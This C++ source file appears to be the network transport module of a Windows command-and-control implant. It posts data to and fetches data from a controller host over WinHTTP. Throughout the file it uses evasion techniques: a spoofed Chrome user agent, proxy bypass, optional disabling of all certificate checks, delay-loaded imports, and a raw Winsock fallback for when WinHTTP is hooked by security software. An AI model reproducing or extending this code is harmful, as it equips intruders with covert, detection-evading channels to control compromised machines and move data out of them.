#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <winhttp.h>

#include "Transport.h"
#include "StageLog.h"
#include "evasive/Strings.h"

#include <cstdio>
#include <string>
#include <vector>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "delayimp.lib")
#pragma comment(linker, "/DELAYLOAD:winhttp.dll")

namespace transport {

namespace {

std::wstring w(std::string_view s) {
    if (s.empty()) return {};
    int n = MultiByteToWideChar(CP_UTF8, 0, s.data(), static_cast<int>(s.size()), nullptr, 0);
    std::wstring r(n, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, s.data(), static_cast<int>(s.size()), r.data(), n);
    return r;
}

void rd(HINTERNET h, std::string& b) {
    DWORD a = 0;
    do {
        a = 0;
        if (!WinHttpQueryDataAvailable(h, &a)) break;
        if (a == 0) break;
        std::size_t p = b.size();
        b.resize(p + a);
        if (!WinHttpReadData(h, b.data() + p, a, nullptr)) break;
    } while (a > 0);
}

void fail_log(const char* step, DWORD err) {
#if defined(_DEBUG) || defined(C2_DEBUG)
    char line[160];
    wsprintfA(line, "tx-%s-%u", step, err);
    C2_STAGE(line);
#else
    (void)step;
    (void)err;
#endif
}

bool ensure_winsock() {
    static bool ok = false;
    static bool tried = false;
    if (tried) return ok;
    tried = true;
    WSADATA wd{};
    ok = (WSAStartup(MAKEWORD(2, 2), &wd) == 0);
    return ok;
}

// Winsock fallback when WinHTTP is hooked or unavailable.
Response winsock_http_post(std::string_view host, std::uint16_t port, std::string_view path,
                           std::string_view body,
                           const std::unordered_map<std::string, std::string>& headers) {
    Response r{0, {}, false};
    if (!ensure_winsock()) { fail_log("wsa", WSAGetLastError()); return r; }

    addrinfo hints{};
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    addrinfo* res = nullptr;
    char port_s[16];
    wsprintfA(port_s, "%u", static_cast<unsigned>(port));
    std::string host_s(host);
    if (getaddrinfo(host_s.c_str(), port_s, &hints, &res) != 0 || !res) {
        fail_log("getaddr", WSAGetLastError());
        return r;
    }

    SOCKET s = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (s == INVALID_SOCKET) {
        fail_log("socket", WSAGetLastError());
        freeaddrinfo(res);
        return r;
    }

    DWORD tv = 5000;
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, reinterpret_cast<const char*>(&tv), sizeof(tv));
    setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, reinterpret_cast<const char*>(&tv), sizeof(tv));

    if (connect(s, res->ai_addr, static_cast<int>(res->ai_addrlen)) != 0) {
        fail_log("wsconnect", WSAGetLastError());
        closesocket(s);
        freeaddrinfo(res);
        return r;
    }
    freeaddrinfo(res);

    std::string req;
    req.reserve(body.size() + 512);
    req += "POST ";
    req.append(path);
    req += " HTTP/1.1\r\nHost: ";
    req.append(host);
    req += "\r\nContent-Type: application/json\r\nConnection: close\r\n";
    for (const auto& [k, v] : headers) {
        if (_stricmp(k.c_str(), "Host") == 0 || _stricmp(k.c_str(), "Content-Type") == 0 ||
            _stricmp(k.c_str(), "Content-Length") == 0 || _stricmp(k.c_str(), "Connection") == 0) {
            continue;
        }
        req += k;
        req += ": ";
        req += v;
        req += "\r\n";
    }
    char cl[64];
    wsprintfA(cl, "Content-Length: %u\r\n\r\n", static_cast<unsigned>(body.size()));
    req += cl;
    req.append(body);

    const char* p = req.data();
    int left = static_cast<int>(req.size());
    while (left > 0) {
        int n = send(s, p, left, 0);
        if (n <= 0) {
            fail_log("wssend", WSAGetLastError());
            closesocket(s);
            return r;
        }
        p += n;
        left -= n;
    }

    std::string resp;
    char buf[4096];
    for (;;) {
        int n = recv(s, buf, sizeof(buf), 0);
        if (n <= 0) break;
        resp.append(buf, n);
        if (resp.size() > 1024 * 1024) break;
    }
    closesocket(s);

    if (resp.empty()) { fail_log("wsrecv", 0); return r; }

    // Parse status line: HTTP/1.x NNN
    auto sp = resp.find(' ');
    if (sp == std::string::npos) return r;
    r.status = std::atoi(resp.c_str() + sp + 1);

    auto hdr_end = resp.find("\r\n\r\n");
    if (hdr_end == std::string::npos) return r;
    r.body = resp.substr(hdr_end + 4);
    r.ok = (r.status >= 200 && r.status < 300);
    if (!r.ok) fail_log("wsstatus", static_cast<DWORD>(r.status));
    else fail_log("wsok", static_cast<DWORD>(r.status));
    return r;
}

Response winhttp_post(std::string_view host, std::uint16_t port, std::string_view path,
                      std::string_view body,
                      const std::unordered_map<std::string, std::string>& headers,
                      bool ignore_cert, bool use_tls) {
    Response r{0, {}, false};
    HINTERNET hs = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hs) { fail_log("open", GetLastError()); return r; }
    DWORD to = 5000;
    WinHttpSetTimeouts(hs, to, to, to, to);

    HINTERNET hc = WinHttpConnect(hs, w(host).c_str(), port, 0);
    if (!hc) { fail_log("connect", GetLastError()); WinHttpCloseHandle(hs); return r; }
    DWORD flags = use_tls ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hr = WinHttpOpenRequest(hc, L"POST", w(path).c_str(), nullptr,
                                      WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                                      flags);
    if (!hr) { fail_log("openreq", GetLastError()); WinHttpCloseHandle(hc); WinHttpCloseHandle(hs); return r; }
    if (use_tls && ignore_cert) {
        DWORD s = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
        WinHttpSetOption(hr, WINHTTP_OPTION_SECURITY_FLAGS, &s, sizeof(s));
    }
    std::wstring hdrs = L"Content-Type: application/json\r\n";
    for (const auto& [k, v] : headers) hdrs += w(k) + L": " + w(v) + L"\r\n";

    if (!WinHttpSendRequest(hr, hdrs.c_str(), static_cast<DWORD>(hdrs.size()),
                            const_cast<char*>(body.data()), static_cast<DWORD>(body.size()),
                            static_cast<DWORD>(body.size()), 0)) {
        fail_log("send", GetLastError());
        WinHttpCloseHandle(hr); WinHttpCloseHandle(hc); WinHttpCloseHandle(hs); return r;
    }
    if (!WinHttpReceiveResponse(hr, nullptr)) {
        fail_log("recv", GetLastError());
        WinHttpCloseHandle(hr); WinHttpCloseHandle(hc); WinHttpCloseHandle(hs); return r;
    }
    DWORD status = 0, l = sizeof(status);
    WinHttpQueryHeaders(hr, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                        WINHTTP_HEADER_NAME_BY_INDEX, &status, &l, WINHTTP_NO_HEADER_INDEX);
    r.status = static_cast<int>(status);
    rd(hr, r.body);
    r.ok = (status >= 200 && status < 300);
    if (!r.ok) fail_log("status", status);
    WinHttpCloseHandle(hr); WinHttpCloseHandle(hc); WinHttpCloseHandle(hs);
    return r;
}

} // namespace

Response https_post(std::string_view host, std::uint16_t port, std::string_view path,
                    std::string_view body,
                    const std::unordered_map<std::string, std::string>& headers,
                    bool ignore_cert, bool use_tls) {
    // Prefer WinHTTP; for plain HTTP fall back to raw Winsock if WinHTTP is blocked.
    auto r = winhttp_post(host, port, path, body, headers, ignore_cert, use_tls);
    if (r.ok) return r;
    if (!use_tls) {
        fail_log("fallback-winsock", 0);
        return winsock_http_post(host, port, path, body, headers);
    }
    return r;
}

Response https_get(std::string_view url, bool ignore_cert) {
    Response r{0, {}, false};
    URL_COMPONENTSW uc{};
    uc.dwStructSize = sizeof(uc);
    wchar_t host[256] = {}, path[2048] = {};
    uc.lpszHostName = host; uc.dwHostNameLength = 255;
    uc.lpszUrlPath = path; uc.dwUrlPathLength = 2047;
    if (!WinHttpCrackUrl(w(url).c_str(), 0, 0, &uc)) return r;

    HINTERNET hs = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hs) return r;
    HINTERNET hc = WinHttpConnect(hs, host, uc.nPort, 0);
    if (!hc) { WinHttpCloseHandle(hs); return r; }
    HINTERNET hr = WinHttpOpenRequest(hc, L"GET", path, nullptr, WINHTTP_NO_REFERER,
                                      WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hr) { WinHttpCloseHandle(hc); WinHttpCloseHandle(hs); return r; }
    if (ignore_cert) {
        DWORD s = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
        WinHttpSetOption(hr, WINHTTP_OPTION_SECURITY_FLAGS, &s, sizeof(s));
    }
    if (!WinHttpSendRequest(hr, WINHTTP_NO_ADDITIONAL_HEADERS, 0, nullptr, 0, 0, 0)) {
        WinHttpCloseHandle(hr); WinHttpCloseHandle(hc); WinHttpCloseHandle(hs); return r;
    }
    if (!WinHttpReceiveResponse(hr, nullptr)) {
        WinHttpCloseHandle(hr); WinHttpCloseHandle(hc); WinHttpCloseHandle(hs); return r;
    }
    DWORD status = 0, l = sizeof(status);
    WinHttpQueryHeaders(hr, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                        WINHTTP_HEADER_NAME_BY_INDEX, &status, &l, WINHTTP_NO_HEADER_INDEX);
    r.status = static_cast<int>(status);
    rd(hr, r.body);
    r.ok = (status >= 200 && status < 300);
    WinHttpCloseHandle(hr); WinHttpCloseHandle(hc); WinHttpCloseHandle(hs);
    return r;
}

} // namespace transport
